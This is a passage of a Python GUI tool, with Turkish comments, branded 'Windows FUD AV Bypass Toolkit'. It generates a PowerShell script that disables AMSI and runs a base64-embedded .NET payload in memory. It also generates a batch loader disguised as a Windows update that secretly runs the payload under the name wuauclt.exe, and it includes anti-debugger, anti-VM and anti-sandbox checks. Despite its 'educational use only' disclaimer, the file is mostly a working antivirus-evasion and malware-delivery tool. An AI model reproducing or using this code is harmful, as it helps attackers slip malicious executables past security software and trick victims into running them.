        modified[timestamp_offset:timestamp_offset+4] = new_timestamp
        
        return bytes(modified)
    
    def create_bypass_script(self, payload_exe, output_script):
        """Bypass script'i olu≈ütur"""
        print("[+] Bypass script'i olu≈üturuluyor...")
        
        with open(payload_exe, 'rb') as f:
            payload_data = f.read()
        
        # Payload'ƒ± base64'e √ßevir
        payload_b64 = base64.b64encode(payload_data).decode()
        
        # PowerShell script'i olu≈ütur
        powershell_script = f'''
# PowerShell AV Bypass Script
# Generated: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

# AMSI Bypass
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execution Policy Bypass
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# Payload (Base64 Encoded)
$payload = "{payload_b64}"

# Decode and execute
$decoded = [System.Convert]::FromBase64String($payload)
$assembly = [System.Reflection.Assembly]::Load($decoded)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, $null)

# Cleanup
Remove-Variable -Name payload, decoded, assembly, entryPoint -Force -ErrorAction SilentlyContinue
[GC]::Collect()
'''
        
        with open(output_script, 'w') as f:
            f.write(powershell_script)
        
        print(f"[+] PowerShell script'i olu≈üturuldu: {output_script}")
        return output_script
    
    def create_batch_loader(self, payload_exe, output_bat):
        """Batch loader olu≈ütur"""
        print("[+] Batch loader olu≈üturuluyor...")
        
        batch_script = f'''@echo off
REM Windows System Update Utility
REM Generated: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

setlocal enabledelayedexpansion
chcp 65001 >nul
title Windows System Update

echo.
echo ============================================
echo    WINDOWS SYSTEM UPDATE UTILITY
echo ============================================
echo.

echo [1/5] Checking system requirements...
timeout /t 2 /nobreak >nul

echo [2/5] Initializing update components...
timeout /t 2 /nobreak >nul

echo [3/5] Downloading security updates...
timeout /t 3 /nobreak >nul

echo [4/5] Applying system patches...
timeout /t 2 /nobreak >nul

echo [5/5] Starting update service...

REM Payload execution
set "TEMP_EXE=%TEMP%\\wuauclt.exe"
copy "{payload_exe}" "!TEMP_EXE!" >nul 2>&1

if exist "!TEMP_EXE!" (
    start "" "!TEMP_EXE!"
    echo [SUCCESS] Update service started
) else (
    echo [INFO] Using system update
)

echo.
echo ============================================
echo     UPDATE COMPLETED SUCCESSFULLY
echo ============================================
echo.
echo [!] System will restart if needed
echo Press any key to exit...
pause >nul

REM Cleanup
if exist "!TEMP_EXE!" del "!TEMP_EXE!" >nul 2>&1

exit /b 0
'''
        
        with open(output_bat, 'w') as f:
            f.write(batch_script)
        
        print(f"[+] Batch loader olu≈üturuldu: {output_bat}")
        return output_bat

# ==================== GELƒ∞≈ûMƒ∞≈û GUI ====================
class AdvancedGUI:
    """Geli≈ümi≈ü GUI"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title(f"Windows FUD AV Bypass Toolkit v{AdvancedConfig.VERSION}")
        self.root.geometry("1200x800")
        self.root.configure(bg='#1e1e1e')
        
        # Deƒüi≈ükenler
        self.payload_path = tk.StringVar()
        self.output_path = tk.StringVar()
        self.selected_techniques = []
        
        # Generator
        self.generator = AVBypassGenerator()
        
        # UI kurulumu
        self.setup_ui()
    
    def setup_ui(self):
        """UI kurulumu"""
        # Ba≈ülƒ±k
        title_frame = tk.Frame(self.root, bg='#1e1e1e', height=80)
        title_frame.pack(fill=tk.X)
        title_frame.pack_propagate(False)
        
        title = tk.Label(
            title_frame,
            text="üîí WINDOWS FUD AV BYPASS TOOLKIT",
            font=("Arial", 20, "bold"),
            fg="#00ff88",
            bg="#1e1e1e"
        )
        title.pack(pady=20)
        
        # Ana frame
        main_frame = tk.Frame(self.root, bg="#2b2b2b")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Sol panel
        left_panel = tk.Frame(main_frame, bg="#3c3c3c", width=350)
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))
        left_panel.pack_propagate(False)
        
        # Saƒü panel
        right_panel = tk.Frame(main_frame, bg="#2b2b2b")
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # === SOL PANEL ===
        
        # Payload se√ßimi
        tk.Label(
            left_panel,
            text="PAYLOAD CONFIGURATION",
            font=("Arial", 12, "bold"),
            fg="#ffffff",
            bg="#3c3c3c"
        ).pack(pady=(20, 10))
        
        tk.Label(
            left_panel,
            text="Payload EXE:",
            font=("Arial", 10),
            fg="#cccccc",
            bg="#3c3c3c"
        ).pack(anchor=tk.W, padx=20, pady=(10, 0))
        
        self.payload_label = tk.Label(
            left_panel,
            text="No file selected",
            font=("Arial", 9),
            fg="#888888",
            bg="#3c3c3c",
            wraplength=300
        )
        self.payload_label.pack(anchor=tk.W, padx=20, pady=(0, 10))
        
        tk.Button(
            left_panel,
            text="üìÅ Select Payload",
            command=self.select_payload,
            bg="#4CAF50",
            fg="white",
            font=("Arial", 10, "bold"),
            relief=tk.FLAT,
            padx=20,
            pady=10
        ).pack(pady=10)
        
        # Output se√ßimi
        tk.Label(
            left_panel,
            text="Output File:",
            font=("Arial", 10),
            fg="#cccccc",
            bg="#3c3c3c"
        ).pack(anchor=tk.W, padx=20, pady=(10, 0))
        
        tk.Entry(
            left_panel,
            textvariable=self.output_path,
            bg="#2b2b2b",
            fg="#ffffff",
            font=("Arial", 10),
            width=30
        ).pack(padx=20, pady=(0, 10))
        
        # Bypass teknikleri
        tk.Label(
            left_panel,
            text="BYPASS TECHNIQUES",
            font=("Arial", 12, "bold"),
            fg="#ffffff",
            bg="#3c3c3c"
        ).pack(pady=(20, 10))
        
        # Scrollable teknik listesi
        tech_frame = tk.Frame(left_panel, bg="#3c3c3c")
        tech_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=(0, 10))
        
        scrollbar = tk.Scrollbar(tech_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.tech_listbox = tk.Listbox(
            tech_frame,
            selectmode=tk.MULTIPLE,
            bg="#2b2b2b",
            fg="#00ff88",
            font=("Consolas", 9),
            yscrollcommand=scrollbar.set,
            height=15
        )
        self.tech_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.tech_listbox.yview)
        
        # Teknikleri doldur
        for i, tech in enumerate(AdvancedConfig.BYPASS_TECHNIQUES[:30]):
            self.tech_listbox.insert(tk.END, f"{i+1:02d}. {tech}")
        
        # Kontrol butonlarƒ±
        button_frame = tk.Frame(left_panel, bg="#3c3c3c")
        button_frame.pack(fill=tk.X, pady=(0, 10), padx=20)
        
        tk.Button(
            button_frame,
            text="Select All",
            command=self.select_all_tech,
            bg="#2196F3",
            fg="white",
            font=("Arial", 9),
            relief=tk.FLAT,
            padx=10
        ).pack(side=tk.LEFT, padx=2)
        
        tk.Button(
            button_frame,
            text="Clear All",
            command=self.clear_all_tech,
            bg="#FF9800",
            fg="white",
            font=("Arial", 9),
            relief=tk.FLAT,
            padx=10
        ).pack(side=tk.LEFT, padx=2)
        
        # Generate butonlarƒ±
        tk.Label(
            left_panel,
            text="GENERATE",
            font=("Arial", 12, "bold"),
            fg="#ffffff",
            bg="#3c3c3c"
        ).pack(pady=(10, 10))
        
        self.generate_exe_btn = tk.Button(
            left_panel,
            text="‚ö° Generate FUD EXE",
            command=self.generate_fud_exe,
            bg="#FF5722",
            fg="white",
            font=("Arial", 11, "bold"),
            relief=tk.FLAT,
            padx=20,
            pady=12,
            state=tk.DISABLED
        )
        self.generate_exe_btn.pack(pady=5)
        
        tk.Button(
            left_panel,
            text="üìú Generate PowerShell Script",
            command=self.generate_powershell,
            bg="#673AB7",
            fg="white",
            font=("Arial", 10),
            relief=tk.FLAT,
            padx=20,
            pady=10
        ).pack(pady=5)
        
        tk.Button(
            left_panel,
            text="üîÑ Generate Batch Loader",
            command=self.generate_batch,
            bg="#009688",
            fg="white",
            font=("Arial", 10),
            relief=tk.FLAT,
            padx=20,
            pady=10
        ).pack(pady=5)
        
        tk.Button(
            left_panel,
            text="üõ°Ô∏è Test Anti-Analysis",
            command=self.test_anti_analysis,
            bg="#3F51B5",
            fg="white",
            font=("Arial", 10),
            relief=tk.FLAT,
            padx=20,
            pady=10
        ).pack(pady=5)
        
        # === SAƒû PANEL ===
        
        # Tab kontrol√º
        notebook = ttk.Notebook(right_panel)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        # Log sekmesi
        log_tab = tk.Frame(notebook, bg="#1e1e1e")
        notebook.add(log_tab, text="Process Log")
        
        self.log_text = scrolledtext.ScrolledText(
            log_tab,
            bg="#1e1e1e",
            fg="#00ff88",
            font=("Consolas", 10),
            wrap=tk.WORD
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Statistics sekmesi
        stats_tab = tk.Frame(notebook, bg="#1e1e1e")
        notebook.add(stats_tab, text="Statistics")
        
        self.stats_text = scrolledtext.ScrolledText(
            stats_tab,
            bg="#1e1e1e",
            fg="#ffffff",
            font=("Consolas", 10),
            wrap=tk.WORD
        )
        self.stats_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Footer
        footer = tk.Label(
            self.root,
            text=f"¬© 2024 Security Research Lab | v{AdvancedConfig.VERSION} | For Educational Use Only",
            font=("Arial", 8),
            fg="#888888",
            bg="#1e1e1e"
        )
        footer.pack(side=tk.BOTTOM, fill=tk.X, pady=5)
        
        # Status bar
        self.status_label = tk.Label(
            self.root,
            text="Ready",
            font=("Arial", 9),
            fg="#cccccc",
            bg="#1e1e1e"
        )
        self.status_label.pack(side=tk.BOTTOM, fill=tk.X, padx=20, pady=(0, 5))
        
        # Ba≈ülangƒ±√ß mesajƒ±
        self.log_message("Windows FUD AV Bypass Toolkit ba≈ülatƒ±ldƒ±", "INFO")
        self.log_message(f"Version: {AdvancedConfig.VERSION}", "INFO")
        self.log_message("Select a payload to begin", "INFO")
    
    def log_message(self, message, level="INFO"):
        """Log mesajƒ± ekle"""
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        
        colors = {
            "INFO": "#00ff88",
            "SUCCESS": "#00ffff",
            "WARNING": "#ffaa00",
            "ERROR": "#ff4444"
        }
        
        formatted = f"[{timestamp}] [{level}] {message}\n"
        
        self.log_text.insert(tk.END, formatted)
        self.log_text.tag_add(level, "end-2c linestart", "end-1c")
        self.log_text.tag_config(level, foreground=colors.get(level, "#ffffff"))
        self.log_text.see(tk.END)
        
        # Status bar g√ºncelle
        self.status_label.config(text=f"{level}: {message[:50]}...")
        
        self.root.update()
    
    def select_payload(self):
        """Payload se√ß"""
        file_path = filedialog.askopenfilename(
            title="Select Payload EXE",
            filetypes=[("EXE files", "*.exe"), ("All files", "*.*")]
        )
        
        if file_path:
            self.payload_path.set(file_path)
            self.payload_label.config(
                text=os.path.basename(file_path),
                fg="#00ff88"
            )
            self.generate_exe_btn.config(state=tk.NORMAL)
            self.log_message(f"Payload selected: {file_path}", "SUCCESS")
            self.log_message(f"Size: {os.path.getsize(file_path):,} bytes", "INFO")
    
    def select_all_tech(self):
        """T√ºm teknikleri se√ß"""
        self.tech_listbox.selection_set(0, tk.END)
        self.log_message(f"Selected {self.tech_listbox.size()} techniques", "INFO")
    
    def clear_all_tech(self):
        """T√ºm se√ßimleri temizle"""
        self.tech_listbox.selection_clear(0, tk.END)
        self.log_message("Cleared all selections", "INFO")
    
    def test_anti_analysis(self):
        """Anti-analiz testi"""
        self.log_message("Running anti-analysis tests...", "INFO")
        
        anti_analysis = AntiAnalysis()
        
        # Debugger kontrol√º
        if anti_analysis.check_debugger():
            self.log_message("Debugger detected!", "WARNING")
        else:
            self.log_message("No debugger detected", "SUCCESS")
        
        # VM kontrol√º
        if anti_analysis.check_virtual_machine():
            self.log_message("Virtual machine detected!", "WARNING")
        else:
            self.log_message("No virtual machine detected", "SUCCESS")
        
        # Sandbox kontrol√º
        if anti_analysis.check_sandbox():
            self.log_message("Sandbox detected!", "WARNING")
        else:
            self.log_message("No sandbox detected", "SUCCESS")
        
        self.log_message("Anti-analysis tests completed", "INFO")
    
    def generate_fud_exe(self):
        """FUD EXE olu≈ütur"""
        if not self.payload_path.get():
            self.log_message("Please select a payload first", "ERROR")
            return
        
        if not self.output_path.get():
            # Varsayƒ±lan output
            self.output_path.set("bypassed.exe")
        
        # Thread'de √ßalƒ±≈ütƒ±r
        thread = threading.Thread(target=self._generate_fud_exe_thread)
        thread.daemon = True
        thread.start()
    
    def _generate_fud_exe_thread(self):
        """FUD EXE olu≈üturma thread'i"""
        try:
            self.generate_exe_btn.config(state=tk.DISABLED, text="‚ö° PROCESSING...")
            
            self.log_message("Starting FUD EXE generation...", "INFO")
            
            # FUD EXE olu≈ütur
            result = self.generator.create_fud_exe(
                self.payload_path.get(),
                self.output_path.get()
            )
            
            if result:
                self.log_message(f"FUD EXE successfully created: {result}", "SUCCESS")
                self.log_message(f"File saved to: {os.path.abspath(result)}", "INFO")
                
                # Statistics g√∂ster
                self.show_statistics(result)
                
                messagebox.showinfo(
                    "Success",
                    f"FUD EXE successfully created!\n\nFile saved to:\n{os.path.abspath(result)}"
                )
            else:
                self.log_message("Failed to create FUD EXE", "ERROR")
                
        except Exception as e:
            self.log_message(f"Error: {str(e)}", "ERROR")
            
        finally:
            self.generate_exe_btn.config(state=tk.NORMAL, text="‚ö° Generate FUD EXE")
    
    def generate_powershell(self):
        """PowerShell script olu≈ütur"""
        if not self.payload_path.get():
            self.log_message("Please select a payload first", "ERROR")
            return
        
        output_file = filedialog.asksaveasfilename(
            title="Save PowerShell Script",
            defaultextension=".ps1",
            filetypes=[("PowerShell Scripts", "*.ps1"), ("All files", "*.*")]
        )
        
        if output_file:
            self.log_message("Creating PowerShell script...", "INFO")
            
            try:
                result = self.generator.create_bypass_script(
                    self.payload_path.get(),
                    output_file
                )
                
                if result:
                    self.log_message(f"PowerShell script created: {result}", "SUCCESS")
                    
            except Exception as e:
                self.log_message(f"Error: {str(e)}", "ERROR")
    
    def generate_batch(self):
        """Batch loader olu≈ütur"""
        if not self.payload_path.get():
            self.log_message("Please select a payload first", "ERROR")
            return
        
        output_file = filedialog.asksaveasfilename(
            title="Save Batch Loader",
            defaultextension=".bat",
            filetypes=[("Batch Files", "*.bat"), ("All files", "*.*")]
        )
        
        if output_file:
            self.log_message("Creating batch loader...", "INFO")
            
            try:
                result = self.generator.create_batch_loader(
                    self.payload_path.get(),
                    output_file
                )
                
                if result:
                    self.log_message(f"Batch loader created: {result}", "SUCCESS")
                    
            except Exception as e:
                self.log_message(f"Error: {str(e)}", "ERROR")
    
    def show_statistics(self, file_path):
        """ƒ∞statistikleri g√∂ster"""
        if not os.path.exists(file_path):
            return
        
        file_size = os.path.getsize(file_path)
        file_hash = hashlib.sha256(open(file_path, 'rb').read()).hexdigest()
        
        stats_text = f"""
{'='*60}
FILE STATISTICS
{'='*60}

File: {os.path.basename(file_path)}
Path: {os.path.abspath(file_path)}
Size: {file_size:,} bytes
SHA256: {file_hash}

{'='*60}
SYSTEM INFORMATION
{'='*60}

OS: {platform.system()} {platform.release()}
Architecture: {platform.architecture()[0]}
Processor: {platform.processor()}

{'='*60}
ANTI-ANALYSIS STATUS
{'='*60}
"""
        
        anti_analysis = AntiAnalysis()
        
        # Debugger kontrol√º
        if anti_analysis.check_debugger():
            stats_text += "Debugger: DETECTED\n"
        else:
            stats_text += "Debugger: NOT DETECTED\n"
        
        # VM kontrol√º
        if anti_analysis.check_virtual_machine():
            stats_text += "Virtual Machine: DETECTED\n"
        else:
            stats_text += "Virtual Machine: NOT DETECTED\n"
        
        # Sandbox kontrol√º
        if anti_analysis.check_sandbox():
            stats_text += "Sandbox: DETECTED\n"
        else:
            stats_text += "Sandbox: NOT DETECTED\n"
        
        stats_text += f"""
{'='*60}
RECOMMENDATIONS
{'='*60}

1. Test in isolated VM environment
2. Disable Windows Defender real-time protection
3. Use latest Windows updates
4. Monitor system behavior
5. Keep backups of original files

{'='*60}
WARNING
{'='*60}

This tool is for EDUCATIONAL PURPOSES ONLY.
Unauthorized use against systems you don't own is ILLEGAL.
Always obtain proper authorization before testing.
"""
        
        self.stats_text.delete(1.0, tk.END)
        self.stats_text.insert(1.0, stats_text)
    
    def run(self):
        """GUI'yi √ßalƒ±≈ütƒ±r"""
        self.root.mainloop()

# ==================== ANA PROGRAM ====================
def main():
    """Ana program"""
    print("="*70)
    print(f"WINDOWS FUD AV BYPASS TOOLKIT v{AdvancedConfig.VERSION}")
    print("For Educational & Research Purposes Only")
    print("="*70)
    
    if len(sys.argv) > 1 and sys.argv[1] == "--gui":
        # GUI modunda √ßalƒ±≈ütƒ±r
        app = AdvancedGUI()
        app.run()
    else:
        # CLI modunda √ßalƒ±≈ütƒ±r
        print("\nUsage:")
        print("  python av_bypass.py --gui")
        print("\nOptions:")
        print("  --gui    Launch GUI interface")
        print("\nExamples:")
        print("  python av_bypass.py --gui")
        
        # Varsayƒ±lan olarak GUI a√ß
        print("\nStarting GUI...")
        app = AdvancedGUI()
        app.run()

if __name__ == "__main__":
    # Gerekli k√ºt√ºphaneleri kontrol et
    if not CRYPTO_AVAILABLE:
        print("[!] cryptography k√ºt√ºphanesi y√ºklenmedi. Bazƒ± ≈üifreleme √∂zellikleri devre dƒ±≈üƒ±.")
        print("    Y√ºklemek i√ßin: pip install cryptography")
    
    # Windows kontrol√º
    if platform.system() != "Windows":
        print("[!] Bu ara√ß sadece Windows'ta √ßalƒ±≈üƒ±r!")
        sys.exit(1)
    
    main()
